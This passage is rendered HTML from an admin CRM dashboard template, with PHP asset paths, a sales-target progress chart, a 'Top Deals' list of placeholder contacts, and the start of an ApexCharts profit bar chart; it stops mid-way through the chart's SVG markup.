      <div class="main-content app-content">
        <div class="container-fluid">
          <!-- Start::page-header -->
          <div
            class="d-md-flex d-block align-items-center justify-content-between my-4 page-header-breadcrumb"
          >
            <div>
              <p class="fw-semibold fs-18 mb-0">Welcome back, Json Taylor !</p>
              <span class="fs-semibold text-muted"
                >Track your sales activity, leads and deals here.</span
              >
            </div>
            <div class="btn-list mt-md-0 mt-2">
              <button
                type="button"
                class="btn btn-primary btn-wave waves-effect waves-light"
              >
                <i class="ri-filter-3-fill me-2 align-middle d-inline-block"></i
                >Filters
              </button>
              <button
                type="button"
                class="btn btn-outline-secondary btn-wave waves-effect waves-light"
              >
                <i
                  class="ri-upload-cloud-line me-2 align-middle d-inline-block"
                ></i
                >Export
              </button>
            </div>
          </div>
          <!-- End::page-header -->
          <!-- Start::row-1 -->
          <div class="row">
            <div class="col-xxl-9 col-xl-12">
              <div class="row">
                <div class="col-xl-4">
                  <div class="row">
                    <div class="col-xl-12">
                      <div class="card custom-card crm-highlight-card">
                        <div class="card-body">
                          <div
                            class="d-flex align-items-center justify-content-between"
                          >
                            <div>
                              <div
                                class="fw-semibold fs-18 text-fixed-white mb-2"
                              >
                                Your target is incomplete
                              </div>
                              <span class="d-block fs-12 text-fixed-white"
                                ><span class="op-7">You have completed</span>
                                <span class="fw-semibold text-warning"
                                  >48%</span
                                >
                                <span class="op-7"
                                  >of the given target, you can also check your
                                  status</span
                                >.</span
                              >
                              <span class="d-block fw-semibold mt-1"
                                ><a
                                  class="text-fixed-white"
                                  href="javascript:void(0);"
                                  ><u>Click here</u></a
                                ></span
                              >
                            </div>
                            <div>
                              <div id="crm-main" style="min-height: 105.7px">
                                <div
                                  id="apexchartsvd11lzdei"
                                  class="apexcharts-canvas apexchartsvd11lzdei apexcharts-theme-light"
                                  style="width: 100px; height: 105.7px"
                                >
                                  <svg
                                    id="SvgjsSvg3257"
                                    width="100"
                                    height="105.7"
                                    xmlns="http://www.w3.org/2000/svg"
                                    version="1.1"
                                    xmlns:xlink="http://www.w3.org/1999/xlink"
                                    xmlns:svgjs="http://svgjs.dev"
                                    class="apexcharts-svg"
                                    xmlns:data="ApexChartsNS"
                                    transform="translate(0, 0)"
                                    style="background: transparent"
                                  >
                                    <foreignObject
                                      x="0"
                                      y="0"
                                      width="100"
                                      height="105.7"
                                      ><div
                                        class="apexcharts-legend"
                                        xmlns="http://www.w3.org/1999/xhtml"
                                      ></div
                                    ></foreignObject>
                                    <g
                                      id="SvgjsG3259"
                                      class="apexcharts-inner apexcharts-graphical"
                                      transform="translate(-0.5, 0)"
                                    >
                                      <defs id="SvgjsDefs3258">
                                        <clipPath id="gridRectMaskvd11lzdei">
                                          <rect
                                            id="SvgjsRect3260"
                                            width="109"
                                            height="127"
                                            x="-3"
                                            y="-1"
                                            rx="0"
                                            ry="0"
                                            opacity="1"
                                            stroke-width="0"
                                            stroke="none"
                                            stroke-dasharray="0"
                                            fill="#fff"
                                          ></rect>
                                        </clipPath>
                                        <clipPath
                                          id="forecastMaskvd11lzdei"
                                        ></clipPath>
                                        <clipPath
                                          id="nonForecastMaskvd11lzdei"
                                        ></clipPath>
                                        <clipPath
                                          id="gridRectMarkerMaskvd11lzdei"
                                        >
                                          <rect
                                            id="SvgjsRect3261"
                                            width="107"
                                            height="129"
                                            x="-2"
                                            y="-2"
                                            rx="0"
                                            ry="0"
                                            opacity="1"
                                            stroke-width="0"
                                            stroke="none"
                                            stroke-dasharray="0"
                                            fill="#fff"
                                          ></rect>
                                        </clipPath>
                                      </defs>
                                      <g
                                        id="SvgjsG3262"
                                        class="apexcharts-radialbar"
                                      >
                                        <g id="SvgjsG3263">
                                          <g
                                            id="SvgjsG3264"
                                            class="apexcharts-tracks"
                                          >
                                            <g
                                              id="SvgjsG3265"
                                              class="apexcharts-radialbar-track apexcharts-track"
                                              rel="1"
                                            >
                                              <path
                                                id="apexcharts-radialbarTrack-0"
                                                d="M 51.5 19.68841463414634 A 31.81158536585366 31.81158536585366 0 1 1 51.49444783097905 19.68841511866449"
                                                fill="none"
                                                fill-opacity="1"
                                                stroke="rgba(242,242,242,0.85)"
                                                stroke-opacity="1"
                                                stroke-linecap="round"
                                                stroke-width="4.806231707317075"
                                                stroke-dasharray="0"
                                                class="apexcharts-radialbar-area"
                                                data:pathOrig="M 51.5 19.68841463414634 A 31.81158536585366 31.81158536585366 0 1 1 51.49444783097905 19.68841511866449"
                                              ></path>
                                            </g>
                                          </g>
                                          <g id="SvgjsG3267">
                                            <g
                                              id="SvgjsG3271"
                                              class="apexcharts-series apexcharts-radial-series"
                                              seriesName="Status"
                                              rel="1"
                                              data:realIndex="0"
                                            >
                                              <path
                                                id="SvgjsPath3272"
                                                d="M 51.5 19.68841463414634 A 31.81158536585366 31.81158536585366 0 0 1 55.37685702121338 83.07446663248744"
                                                fill="none"
                                                fill-opacity="0.85"
                                                stroke="rgba(255,255,255,0.9)"
                                                stroke-opacity="1"
                                                stroke-linecap="round"
                                                stroke-width="4.95487804878049"
                                                stroke-dasharray="0"
                                                class="apexcharts-radialbar-area apexcharts-radialbar-slice-0"
                                                data:angle="173"
                                                data:value="48"
                                                index="0"
                                                j="0"
                                                data:pathOrig="M 51.5 19.68841463414634 A 31.81158536585366 31.81158536585366 0 0 1 55.37685702121338 83.07446663248744"
                                              ></path>
                                            </g>
                                            <circle
                                              id="SvgjsCircle3268"
                                              r="29.408469512195122"
                                              cx="51.5"
                                              cy="51.5"
                                              class="apexcharts-radialbar-hollow"
                                              fill="#ffffff"
                                            ></circle>
                                            <g
                                              id="SvgjsG3269"
                                              class="apexcharts-datalabels-group"
                                              transform="translate(0, 0) scale(1)"
                                              style="opacity: 1"
                                            >
                                              <text
                                                id="SvgjsText3270"
                                                font-family="Helvetica, Arial, sans-serif"
                                                x="51.5"
                                                y="56.5"
                                                text-anchor="middle"
                                                dominant-baseline="auto"
                                                font-size=".875rem"
                                                font-weight="600"
                                                fill="#4b9bfa"
                                                class="apexcharts-text apexcharts-datalabel-value"
                                                style="
                                                  font-family: Helvetica, Arial,
                                                    sans-serif;
                                                "
                                              >
                                                48%
                                              </text>
                                            </g>
                                          </g>
                                        </g>
                                      </g>
                                      <line
                                        id="SvgjsLine3273"
                                        x1="0"
                                        y1="0"
                                        x2="103"
                                        y2="0"
                                        stroke="#b6b6b6"
                                        stroke-dasharray="0"
                                        stroke-width="1"
                                        stroke-linecap="butt"
                                        class="apexcharts-ycrosshairs"
                                      ></line>
                                      <line
                                        id="SvgjsLine3274"
                                        x1="0"
                                        y1="0"
                                        x2="103"
                                        y2="0"
                                        stroke-dasharray="0"
                                        stroke-width="0"
                                        stroke-linecap="butt"
                                        class="apexcharts-ycrosshairs-hidden"
                                      ></line>
                                    </g>
                                  </svg>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div class="col-xl-12">
                    <div class="card custom-card">
                      <div class="card-header justify-content-between">
                        <div class="card-title">Top Deals</div>
                        <div class="dropdown">
                          <a
                            aria-label="anchor"
                            href="javascript:void(0);"
                            class="btn btn-icon btn-sm btn-light"
                            data-bs-toggle="dropdown"
                            aria-expanded="false"
                          >
                            <i class="fe fe-more-vertical"></i>
                          </a>
                          <ul class="dropdown-menu">
                            <li>
                              <a
                                class="dropdown-item"
                                href="javascript:void(0);"
                                >Week</a
                              >
                            </li>
                            <li>
                              <a
                                class="dropdown-item"
                                href="javascript:void(0);"
                                >Month</a
                              >
                            </li>
                            <li>
                              <a
                                class="dropdown-item"
                                href="javascript:void(0);"
                                >Year</a
                              >
                            </li>
                          </ul>
                        </div>
                      </div>
                      <div class="card-body">
                        <ul class="list-unstyled crm-top-deals mb-0">
                          <li>
                            <div class="d-flex align-items-top flex-wrap">
                              <div class="me-2">
                                <span class="avatar avatar-sm avatar-rounded">
                                  <img
                                    src="<?php echo base_url('public/admin') ?>/assets/images/faces/10.jpg"
                                    alt=""
                                  />
                                </span>
                              </div>
                              <div class="flex-fill">
                                <p class="fw-semibold mb-0">Michael Jordan</p>
                                <span class="text-muted fs-12"
                                  >michael.jordan@example.com</span
                                >
                              </div>
                              <div class="fw-semibold fs-15">$2,893</div>
                            </div>
                          </li>
                          <li>
                            <div class="d-flex align-items-top flex-wrap">
                              <div class="me-2">
                                <span
                                  class="avatar avatar-sm avatar-rounded bg-warning-transparent fw-semibold"
                                >
                                  EK
                                </span>
                              </div>
                              <div class="flex-fill">
                                <p class="fw-semibold mb-0">Emigo Kiaren</p>
                                <span class="text-muted fs-12"
                                  >emigo.kiaren@gmail.com</span
                                >
                              </div>
                              <div class="fw-semibold fs-15">$4,289</div>
                            </div>
                          </li>
                          <li>
                            <div class="d-flex align-items-top flex-wrap">
                              <div class="me-2">
                                <span class="avatar avatar-sm avatar-rounded">
                                  <img
                                    src="<?php echo base_url('public/admin') ?>/assets/images/faces/12.jpg"
                                    alt=""
                                  />
                                </span>
                              </div>
                              <div class="flex-fill">
                                <p class="fw-semibold mb-0">Randy Origoan</p>
                                <span class="text-muted fs-12"
                                  >randy.origoan@gmail.com</span
                                >
                              </div>
                              <div class="fw-semibold fs-15">$6,347</div>
                            </div>
                          </li>
                          <li>
                            <div class="d-flex align-items-top flex-wrap">
                              <div class="me-2">
                                <span
                                  class="avatar avatar-sm avatar-rounded bg-success-transparent fw-semibold"
                                >
                                  GP
                                </span>
                              </div>
                              <div class="flex-fill">
                                <p class="fw-semibold mb-0">George Pieterson</p>
                                <span class="text-muted fs-12"
                                  >george.pieterson@gmail.com</span
                                >
                              </div>
                              <div class="fw-semibold fs-15">$3,894</div>
                            </div>
                          </li>
                          <li>
                            <div class="d-flex align-items-top flex-wrap">
                              <div class="me-2">
                                <span
                                  class="avatar avatar-sm avatar-rounded bg-primary-transparent fw-semibold"
                                >
                                  KA
                                </span>
                              </div>
                              <div class="flex-fill">
                                <p class="fw-semibold mb-0">Kiara Advain</p>
                                <span class="text-muted fs-12"
                                  >kiaraadvain214@gmail.com</span
                                >
                              </div>
                              <div class="fw-semibold fs-15">$2,679</div>
                            </div>
                          </li>
                        </ul>
                      </div>
                    </div>
                  </div>
                  <div
                    class="col-xxl-12 col-xl-12 col-lg-12 col-md-12 col-sm-12 col-12"
                  >
                    <div class="card custom-card">
                      <div class="card-header justify-content-between">
                        <div class="card-title">Profit Earned</div>
                        <div class="dropdown">
                          <a
                            href="javascript:void(0);"
                            class="p-2 fs-12 text-muted"
                            data-bs-toggle="dropdown"
                            aria-expanded="false"
                          >
                            View All<i
                              class="ri-arrow-down-s-line align-middle ms-1 d-inline-block"
                            ></i>
                          </a>
                          <ul class="dropdown-menu" role="menu">
                            <li>
                              <a
                                class="dropdown-item"
                                href="javascript:void(0);"
                                >Today</a
                              >
                            </li>
                            <li>
                              <a
                                class="dropdown-item"
                                href="javascript:void(0);"
                                >This Week</a
                              >
                            </li>
                            <li>
                              <a
                                class="dropdown-item"
                                href="javascript:void(0);"
                                >Last Week</a
                              >
                            </li>
                          </ul>
                        </div>
                      </div>
                      <div class="card-body py-0 ps-0">
                        <div id="crm-profits-earned" style="min-height: 195px">
                          <div
                            id="apexchartswu6x3dqj"
                            class="apexcharts-canvas apexchartswu6x3dqj apexcharts-theme-light"
                            style="width: 325px; height: 180px"
                          >
                            <svg
                              id="SvgjsSvg3624"
                              width="325"
                              height="180"
                              xmlns="http://www.w3.org/2000/svg"
                              version="1.1"
                              xmlns:xlink="http://www.w3.org/1999/xlink"
                              xmlns:svgjs="http://svgjs.dev"
                              class="apexcharts-svg"
                              xmlns:data="ApexChartsNS"
                              transform="translate(0, 0)"
                              style="background: transparent"
                            >
                              <foreignObject
                                x="0"
                                y="0"
                                width="325"
                                height="180"
                                ><div
                                  class="apexcharts-legend"
                                  xmlns="http://www.w3.org/1999/xhtml"
                                  style="max-height: 90px"
                                ></div
                              ></foreignObject>
                              <g
                                id="SvgjsG3719"
                                class="apexcharts-yaxis"
                                rel="0"
                                transform="translate(15.359375, 0)"
                              >
                                <g
                                  id="SvgjsG3720"
                                  class="apexcharts-yaxis-texts-g"
                                >
                                  <text
                                    id="SvgjsText3722"
                                    font-family="Helvetica, Arial, sans-serif"
                                    x="20"
                                    y="31.5"
                                    text-anchor="end"
                                    dominant-baseline="auto"
                                    font-size="11px"
                                    font-weight="400"
                                    fill="#373d3f"
                                    class="apexcharts-text apexcharts-yaxis-label"
                                    style="
                                      font-family: Helvetica, Arial, sans-serif;
                                    "
                                  >
                                    <tspan id="SvgjsTspan3723">100</tspan>
                                    <title>100</title>
                                  </text>
                                  <text
                                    id="SvgjsText3725"
                                    font-family="Helvetica, Arial, sans-serif"
                                    x="20"
                                    y="53.9696"
                                    text-anchor="end"
                                    dominant-baseline="auto"
                                    font-size="11px"
                                    font-weight="400"
                                    fill="#373d3f"
                                    class="apexcharts-text apexcharts-yaxis-label"
                                    style="
                                      font-family: Helvetica, Arial, sans-serif;
                                    "
                                  >
                                    <tspan id="SvgjsTspan3726">80</tspan>
                                    <title>80</title>
                                  </text>
                                  <text
                                    id="SvgjsText3728"
                                    font-family="Helvetica, Arial, sans-serif"
                                    x="20"
                                    y="76.4392"
                                    text-anchor="end"
                                    dominant-baseline="auto"
                                    font-size="11px"
                                    font-weight="400"
                                    fill="#373d3f"
                                    class="apexcharts-text apexcharts-yaxis-label"
                                    style="
                                      font-family: Helvetica, Arial, sans-serif;
                                    "
                                  >
                                    <tspan id="SvgjsTspan3729">60</tspan>
                                    <title>60</title>
                                  </text>
                                  <text
                                    id="SvgjsText3731"
                                    font-family="Helvetica, Arial, sans-serif"
                                    x="20"
                                    y="98.9088"
                                    text-anchor="end"
                                    dominant-baseline="auto"
                                    font-size="11px"
                                    font-weight="400"
                                    fill="#373d3f"
                                    class="apexcharts-text apexcharts-yaxis-label"
                                    style="
                                      font-family: Helvetica, Arial, sans-serif;
                                    "
                                  >
                                    <tspan id="SvgjsTspan3732">40</tspan>
                                    <title>40</title>
                                  </text>
                                  <text
                                    id="SvgjsText3734"
                                    font-family="Helvetica, Arial, sans-serif"
                                    x="20"
                                    y="121.3784"
                                    text-anchor="end"
                                    dominant-baseline="auto"
                                    font-size="11px"
                                    font-weight="400"
                                    fill="#373d3f"
                                    class="apexcharts-text apexcharts-yaxis-label"
                                    style="
                                      font-family: Helvetica, Arial, sans-serif;
                                    "
                                  >
                                    <tspan id="SvgjsTspan3735">20</tspan>
                                    <title>20</title>
                                  </text>
                                  <text
                                    id="SvgjsText3737"
                                    font-family="Helvetica, Arial, sans-serif"
                                    x="20"
                                    y="143.848"
                                    text-anchor="end"
                                    dominant-baseline="auto"
                                    font-size="11px"
                                    font-weight="400"
                                    fill="#373d3f"
                                    class="apexcharts-text apexcharts-yaxis-label"
                                    style="
                                      font-family: Helvetica, Arial, sans-serif;
                                    "
                                  >
                                    <tspan id="SvgjsTspan3738">0</tspan>
                                    <title>0</title>
                                  </text>
                                </g>
                              </g>
                              <g
                                id="SvgjsG3626"
                                class="apexcharts-inner apexcharts-graphical"
                                transform="translate(45.359375, 30)"
                              >
                                <defs id="SvgjsDefs3625">
                                  <linearGradient
                                    id="SvgjsLinearGradient3629"
                                    x1="0"
                                    y1="0"
                                    x2="0"
                                    y2="1"
                                  >
                                    <stop
                                      id="SvgjsStop3630"
                                      stop-opacity="0.4"
                                      stop-color="rgba(216,227,240,0.4)"
                                      offset="0"
                                    ></stop>
                                    <stop
                                      id="SvgjsStop3631"
                                      stop-opacity="0.5"
                                      stop-color="rgba(190,209,230,0.5)"
                                      offset="1"
                                    ></stop>
                                    <stop
                                      id="SvgjsStop3632"
                                      stop-opacity="0.5"
                                      stop-color="rgba(190,209,230,0.5)"
                                      offset="1"
                                    ></stop>
                                  </linearGradient>
                                  <clipPath id="gridRectMaskwu6x3dqj">
                                    <rect
                                      id="SvgjsRect3634"
                                      width="275.640625"
                                      height="114.34800000000001"
                                      x="-3"
                                      y="-1"
                                      rx="0"
                                      ry="0"
                                      opacity="1"
                                      stroke-width="0"
                                      stroke="none"
                                      stroke-dasharray="0"
                                      fill="#fff"
                                    ></rect>
                                  </clipPath>
                                  <clipPath
                                    id="forecastMaskwu6x3dqj"
                                  ></clipPath>
                                  <clipPath
                                    id="nonForecastMaskwu6x3dqj"
                                  ></clipPath>
                                  <clipPath id="gridRectMarkerMaskwu6x3dqj">
                                    <rect
                                      id="SvgjsRect3635"
                                      width="273.640625"
                                      height="116.34800000000001"
                                      x="-2"
                                      y="-2"
                                      rx="0"
                                      ry="0"
                                      opacity="1"
                                      stroke-width="0"
                                      stroke="none"
                                      stroke-dasharray="0"
                                      fill="#fff"
                                    ></rect>
                                  </clipPath>
                                </defs>
                                <rect
                                  id="SvgjsRect3633"
                                  width="11.556026785714284"
                                  height="112.34800000000001"
                                  x="0"
                                  y="0"
                                  rx="0"
                                  ry="0"
                                  opacity="1"
                                  stroke-width="0"
                                  stroke-dasharray="3"
                                  fill="url(#SvgjsLinearGradient3629)"
                                  class="apexcharts-xcrosshairs"
                                  y2="112.34800000000001"
                                  filter="none"
                                  fill-opacity="0.9"
                                ></rect>
                                <line
                                  id="SvgjsLine3677"
                                  x1="0"
                                  y1="113.34800000000001"
                                  x2="0"
                                  y2="119.34800000000001"
                                  stroke="rgba(119, 119, 142, 0.05)"
                                  stroke-dasharray="0"
                                  stroke-linecap="butt"
                                  class="apexcharts-xaxis-tick"
                                ></line>
                                <line
                                  id="SvgjsLine3678"
                                  x1="38.520089285714285"
                                  y1="113.34800000000001"
                                  x2="38.520089285714285"
                                  y2="119.34800000000001"
                                  stroke="rgba(119, 119, 142, 0.05)"
                                  stroke-dasharray="0"
                                  stroke-linecap="butt"
                                  class="apexcharts-xaxis-tick"
                                ></line>
                                <line
                                  id="SvgjsLine3679"
                                  x1="77.04017857142857"
                                  y1="113.34800000000001"
                                  x2="77.04017857142857"
                                  y2="119.34800000000001"
                                  stroke="rgba(119, 119, 142, 0.05)"
                                  stroke-dasharray="0"
                                  stroke-linecap="butt"
                                  class="apexcharts-xaxis-tick"
                                ></line>
                                <line
                                  id="SvgjsLine3680"
                                  x1="115.56026785714286"
                                  y1="113.34800000000001"
                                  x2="115.56026785714286"
                                  y2="119.34800000000001"
                                  stroke="rgba(119, 119, 142, 0.05)"
                                  stroke-dasharray="0"
                                  stroke-linecap="butt"
                                  class="apexcharts-xaxis-tick"
                                ></line>
                                <line
                                  id="SvgjsLine3681"
                                  x1="154.08035714285714"
                                  y1="113.34800000000001"
                                  x2="154.08035714285714"
                                  y2="119.34800000000001"
                                  stroke="rgba(119, 119, 142, 0.05)"
                                  stroke-dasharray="0"
                                  stroke-linecap="butt"
                                  class="apexcharts-xaxis-tick"
                                ></line>
                                <line
                                  id="SvgjsLine3682"
                                  x1="192.60044642857142"
                                  y1="113.34800000000001"
                                  x2="192.60044642857142"
                                  y2="119.34800000000001"
                                  stroke="rgba(119, 119, 142, 0.05)"
                                  stroke-dasharray="0"
                                  stroke-linecap="butt"
                                  class="apexcharts-xaxis-tick"
                                ></line>
                                <line
                                  id="SvgjsLine3683"
                                  x1="231.1205357142857"
                                  y1="113.34800000000001"
                                  x2="231.1205357142857"
                                  y2="119.34800000000001"
                                  stroke="rgba(119, 119, 142, 0.05)"
                                  stroke-dasharray="0"
                                  stroke-linecap="butt"
                                  class="apexcharts-xaxis-tick"
                                ></line>
                                <line
                                  id="SvgjsLine3684"
                                  x1="269.640625"
                                  y1="113.34800000000001"
                                  x2="269.640625"
                                  y2="119.34800000000001"
                                  stroke="rgba(119, 119, 142, 0.05)"
                                  stroke-dasharray="0"
                                  stroke-linecap="butt"
                                  class="apexcharts-xaxis-tick"
                                ></line>
                                <g id="SvgjsG3673" class="apexcharts-grid">
                                  <g
                                    id="SvgjsG3674"
                                    class="apexcharts-gridlines-horizontal"
                                  >
                                    <line
                                      id="SvgjsLine3686"
                                      x1="0"
                                      y1="22.469600000000003"
                                      x2="269.640625"
                                      y2="22.469600000000003"
                                      stroke="#f1f1f1"
                                      stroke-dasharray="3"
                                      stroke-linecap="butt"
                                      class="apexcharts-gridline"
                                    ></line>
                                    <line
                                      id="SvgjsLine3687"
                                      x1="0"
                                      y1="44.93920000000001"
                                      x2="269.640625"
                                      y2="44.93920000000001"
                                      stroke="#f1f1f1"
                                      stroke-dasharray="3"
                                      stroke-linecap="butt"
                                      class="apexcharts-gridline"
                                    ></line>
                                    <line
                                      id="SvgjsLine3688"
                                      x1="0"
                                      y1="67.40880000000001"
                                      x2="269.640625"
                                      y2="67.40880000000001"
                                      stroke="#f1f1f1"
                                      stroke-dasharray="3"
                                      stroke-linecap="butt"
                                      class="apexcharts-gridline"
                                    ></line>
                                    <line
                                      id="SvgjsLine3689"
                                      x1="0"
                                      y1="89.87840000000001"
                                      x2="269.640625"
                                      y2="89.87840000000001"
                                      stroke="#f1f1f1"
                                      stroke-dasharray="3"
                                      stroke-linecap="butt"
                                      class="apexcharts-gridline"
                                    ></line>
                                  </g>
                                  <g
                                    id="SvgjsG3675"
                                    class="apexcharts-gridlines-vertical"
                                  ></g>
                                  <line
                                    id="SvgjsLine3692"
                                    x1="0"
                                    y1="112.34800000000001"
                                    x2="269.640625"
                                    y2="112.34800000000001"
                                    stroke="transparent"
                                    stroke-dasharray="0"
                                    stroke-linecap="butt"
                                  ></line>
                                  <line
                                    id="SvgjsLine3691"
                                    x1="0"
                                    y1="1"
                                    x2="0"
                                    y2="112.34800000000001"
                                    stroke="transparent"
                                    stroke-dasharray="0"
                                    stroke-linecap="butt"
                                  ></line>
                                </g>
                                <g
                                  id="SvgjsG3676"
                                  class="apexcharts-grid-borders"
                                >
                                  <line
                                    id="SvgjsLine3685"
                                    x1="0"
                                    y1="0"
                                    x2="269.640625"
                                    y2="0"
                                    stroke="#f1f1f1"
                                    stroke-dasharray="3"
                                    stroke-linecap="butt"
                                    class="apexcharts-gridline"
                                  ></line>
                                  <line
                                    id="SvgjsLine3690"
                                    x1="0"
                                    y1="112.34800000000001"
                                    x2="269.640625"
                                    y2="112.34800000000001"
                                    stroke="#f1f1f1"
                                    stroke-dasharray="3"
                                    stroke-linecap="butt"
                                    class="apexcharts-gridline"
                                  ></line>
                                  <line
                                    id="SvgjsLine3718"
                                    x1="0"
                                    y1="113.34800000000001"
                                    x2="269.640625"
                                    y2="113.34800000000001"
                                    stroke="rgba(119, 119, 142, 0.05)"
                                    stroke-dasharray="0"
                                    stroke-width="1"
                                    stroke-linecap="butt"
                                  ></line>
                                </g>
                                <g
                                  id="SvgjsG3636"
                                  class="apexcharts-bar-series apexcharts-plot-series"
                                >
                                  <g
                                    id="SvgjsG3637"
                                    class="apexcharts-series"
                                    rel="1"
                                    seriesName="ProfitxEarned"
                                    data:realIndex="0"
                                  >
                                    <path
                                      id="SvgjsPath3642"
                                      d="M 7.704017857142858 107.34900000000002 L 7.704017857142858 67.91588000000002 C 7.704017857142858 65.41588000000002 10.204017857142858 62.91588000000001 12.704017857142858 62.91588000000001 L 12.704017857142858 62.91588000000001 C 14.98203125 62.91588000000001 17.260044642857142 65.41588000000002 17.260044642857142 67.91588000000002 L 17.260044642857142 107.34900000000002 C 17.260044642857142 109.84900000000002 14.760044642857142 112.34900000000002 12.260044642857142 112.34900000000002 L 12.260044642857142 112.34900000000002 C 9.98203125 112.34900000000002 7.704017857142858 109.84900000000002 7.704017857142858 107.34900000000002 Z "
                                      fill="rgba(132,90,223, 1)"
                                      fill-opacity="1"
                                      stroke="rgba(132,90,223, 1)"
                                      stroke-opacity="1"
                                      stroke-linecap="round"
                                      stroke-width="2"
                                      stroke-dasharray="0"
                                      class="apexcharts-bar-area"
                                      index="0"
                                      clip-path="url(#gridRectMaskwu6x3dqj)"
                                      pathTo="M 7.704017857142858 107.34900000000002 L 7.704017857142858 67.91588000000002 C 7.704017857142858 65.41588000000002 10.204017857142858 62.91588000000001 12.704017857142858 62.91588000000001 L 12.704017857142858 62.91588000000001 C 14.98203125 62.91588000000001 17.260044642857142 65.41588000000002 17.260044642857142 67.91588000000002 L 17.260044642857142 107.34900000000002 C 17.260044642857142 109.84900000000002 14.760044642857142 112.34900000000002 12.260044642857142 112.34900000000002 L 12.260044642857142 112.34900000000002 C 9.98203125 112.34900000000002 7.704017857142858 109.84900000000002 7.704017857142858 107.34900000000002 Z "
                                      pathFrom="M 7.704017857142858 107.34900000000002 L 7.704017857142858 67.91588000000002 C 7.704017857142858 65.41588000000002 10.204017857142858 62.91588000000001 12.704017857142858 62.91588000000001 L 12.704017857142858 62.91588000000001 C 14.98203125 62.91588000000001 17.260044642857142 65.41588000000002 17.260044642857142 67.91588000000002 L 17.260044642857142 107.34900000000002 C 17.260044642857142 109.84900000000002 14.760044642857142 112.34900000000002 12.260044642857142 112.34900000000002 L 12.260044642857142 112.34900000000002 C 9.98203125 112.34900000000002 7.704017857142858 109.84900000000002 7.704017857142858 107.34900000000002 Z  L 7.704017857142858 112.34900000000002 L 17.260044642857142 112.34900000000002 L 17.260044642857142 112.34900000000002 L 17.260044642857142 112.34900000000002 L 17.260044642857142 112.34900000000002 L 17.260044642857142 112.34900000000002 L 7.704017857142858 112.34900000000002 Z"
                                      cy="62.91488000000001"
                                      cx="45.22410714285714"
                                      j="0"
                                      val="44"
                                      barHeight="49.43312"
                                      barWidth="11.556026785714284"
                                    ></path>
                                    <path
                                      id="SvgjsPath3644"
                                      d="M 46.22410714285714 107.34900000000002 L 46.22410714285714 70.16284000000002 C 46.22410714285714 67.66284000000002 48.72410714285714 65.16284000000002 51.22410714285714 65.16284000000002 L 51.22410714285714 65.16284000000002 C 53.50212053571428 65.16284000000002 55.78013392857143 67.66284000000002 55.78013392857143 70.16284000000002 L 55.78013392857143 107.34900000000002 C 55.78013392857143 109.84900000000002 53.28013392857143 112.34900000000002 50.78013392857143 112.34900000000002 L 50.78013392857143 112.34900000000002 C 48.50212053571428 112.34900000000002 46.22410714285714 109.84900000000002 46.22410714285714 107.34900000000002 Z "
                                      fill="rgba(132,90,223, 1)"
                                      fill-opacity="1"
                                      stroke="rgba(132,90,223, 1)"
                                      stroke-opacity="1"
                                      stroke-linecap="round"
                                      stroke-width="2"
                                      stroke-dasharray="0"
                                      class="apexcharts-bar-area"
                                      index="0"
                                      clip-path="url(#gridRectMaskwu6x3dqj)"
                                      pathTo="M 46.22410714285714 107.34900000000002 L 46.22410714285714 70.16284000000002 C 46.22410714285714 67.66284000000002 48.72410714285714 65.16284000000002 51.22410714285714 65.16284000000002 L 51.22410714285714 65.16284000000002 C 53.50212053571428 65.16284000000002 55.78013392857143 67.66284000000002 55.78013392857143 70.16284000000002 L 55.78013392857143 107.34900000000002 C 55.78013392857143 109.84900000000002 53.28013392857143 112.34900000000002 50.78013392857143 112.34900000000002 L 50.78013392857143 112.34900000000002 C 48.50212053571428 112.34900000000002 46.22410714285714 109.84900000000002 46.22410714285714 107.34900000000002 Z "
                                      pathFrom="M 46.22410714285714 107.34900000000002 L 46.22410714285714 70.16284000000002 C 46.22410714285714 67.66284000000002 48.72410714285714 65.16284000000002 51.22410714285714 65.16284000000002 L 51.22410714285714 65.16284000000002 C 53.50212053571428 65.16284000000002 55.78013392857143 67.66284000000002 55.78013392857143 70.16284000000002 L 55.78013392857143 107.34900000000002 C 55.78013392857143 109.84900000000002 53.28013392857143 112.34900000000002 50.78013392857143 112.34900000000002 L 50.78013392857143 112.34900000000002 C 48.50212053571428 112.34900000000002 46.22410714285714 109.84900000000002 46.22410714285714 107.34900000000002 Z  L 46.22410714285714 112.34900000000002 L 55.78013392857143 112.34900000000002 L 55.78013392857143 112.34900000000002 L 55.78013392857143 112.34900000000002 L 55.78013392857143 112.34900000000002 L 55.78013392857143 112.34900000000002 L 46.22410714285714 112.34900000000002 Z"
                                      cy="65.16184000000001"
                                      cx="83.74419642857143"
                                      j="1"
                                      val="42"
                                      barHeight="47.18616"
                                      barWidth="11.556026785714284"
                                    ></path>
                                    <path
                                      id="SvgjsPath3646"
                                      d="M 84.74419642857143 107.34900000000002 L 84.74419642857143 53.310640000000014 C 84.74419642857143 50.810640000000014 87.24419642857143 48.310640000000014 89.74419642857143 48.310640000000014 L 89.74419642857143 48.310640000000014 C 92.02220982142856 48.310640000000014 94.30022321428571 50.810640000000014 94.30022321428571 53.310640000000014 L 94.30022321428571 107.34900000000002 C 94.30022321428571 109.84900000000002 91.80022321428571 112.34900000000002 89.30022321428571 112.34900000000002 L 89.30022321428571 112.34900000000002 C 87.02220982142856 112.34900000000002 84.74419642857143 109.84900000000002 84.74419642857143 107.34900000000002 Z "
                                      fill="rgba(132,90,223, 1)"
                                      fill-opacity="1"
                                      stroke="rgba(132,90,223, 1)"
                                      stroke-opacity="1"
                                      stroke-linecap="round"
                                      stroke-width="2"
                                      stroke-dasharray="0"
                                      class="apexcharts-bar-area"
                                      index="0"
                                      clip-path="url(#gridRectMaskwu6x3dqj)"
                                      pathTo="M 84.74419642857143 107.34900000000002 L 84.74419642857143 53.310640000000014 C 84.74419642857143 50.810640000000014 87.24419642857143 48.310640000000014 89.74419642857143 48.310640000000014 L 89.74419642857143 48.310640000000014 C 92.02220982142856 48.310640000000014 94.30022321428571 50.810640000000014 94.30022321428571 53.310640000000014 L 94.30022321428571 107.34900000000002 C 94.30022321428571 109.84900000000002 91.80022321428571 112.34900000000002 89.30022321428571 112.34900000000002 L 89.30022321428571 112.34900000000002 C 87.02220982142856 112.34900000000002 84.74419642857143 109.84900000000002 84.74419642857143 107.34900000000002 Z "
